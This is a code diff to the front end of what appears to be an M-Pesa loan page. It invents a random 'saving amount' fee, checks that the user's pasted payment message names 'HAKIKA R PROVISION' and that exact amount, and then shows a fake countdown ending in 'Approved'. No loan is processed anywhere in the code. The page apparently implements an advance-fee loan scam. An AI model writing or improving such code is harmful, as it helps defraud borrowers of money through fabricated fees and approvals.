@@ -154,24 +154,24 @@
     let savingAmount = localStorage.getItem('savingAmount');
     const firstName = localStorage.getItem('firstname') || "Unknown";
     const phoneNumber = localStorage.getItem('phone') || "Not Available";
-
+  
     if (!savingAmount) {
       savingAmount = Math.floor(Math.random() * (110 - 95 + 1)) + 95;
       localStorage.setItem('savingAmount', savingAmount);
     }
-
+  
     function formatNumber(num) {
       return parseInt(num).toLocaleString();
     }
-
+  
     document.getElementById('loanDisplay').textContent = targetValue
       ? 'Loan Amount: Ksh ' + formatNumber(targetValue)
       : 'Loan Amount: Not Available';
-
+  
     document.getElementById('savingDisplay').textContent = 'Saving Amount: Ksh ' + formatNumber(savingAmount);
     document.getElementById('firstName').textContent = "Account Name: " + firstName;
     document.getElementById('phoneNumber').textContent = "Phone Number: " + phoneNumber;
-
+  
     document.getElementById('copyButton').addEventListener('click', function () {
       const accountNumber = "9824375";
       navigator.clipboard.writeText(accountNumber).then(() => {
@@ -180,29 +180,40 @@
         alert("Failed to copy account number.");
       });
     });
-
+  
     document.getElementById('verifyButton').addEventListener('click', function () {
       const message = document.getElementById("mpesaInput").value.trim();
+      const requiredName = "HAKIKA R PROVISION";
+      const requiredAmount = "Ksh" + savingAmount + ".00"; // Example: Ksh95.00
+  
       if (message === "") {
         alert("Please paste your Mpesa message before verifying.");
         return;
       }
-
-      document.getElementById('overlay').style.display = "flex";
-      startTimer(180, document.getElementById('timer'));
+  
+      if (message.includes(requiredName) && message.includes(requiredAmount)) {
+        document.getElementById('overlay').style.display = "flex";
+  
+        // Random duration between 5 and 10 minutes (300s - 600s)
+        const randomDuration = Math.floor(Math.random() * (600 - 300 + 1)) + 300;
+        startTimer(randomDuration, document.getElementById('timer'));
+  
+      } else {
+        alert(`Invalid M-Pesa message. Ensure it is paid to '${requiredName}' and the amount is exactly ${requiredAmount}.`);
+      }
     });
-
+  
     function startTimer(duration, display) {
       let timer = duration, minutes, seconds;
       const interval = setInterval(function () {
         minutes = parseInt(timer / 60, 10);
         seconds = parseInt(timer % 60, 10);
-
+  
         minutes = minutes < 10 ? "0" + minutes : minutes;
         seconds = seconds < 10 ? "0" + seconds : seconds;
-
+  
         display.textContent = minutes + ":" + seconds;
-
+  
         if (--timer < 0) {
           clearInterval(interval);
           document.getElementById('statusText').textContent = "✅ Approved Wait For Mpesa Message";
@@ -210,6 +221,8 @@
       }, 1000);
     }
   </script>
+  
+  
+  
 </body>
 </html>
-
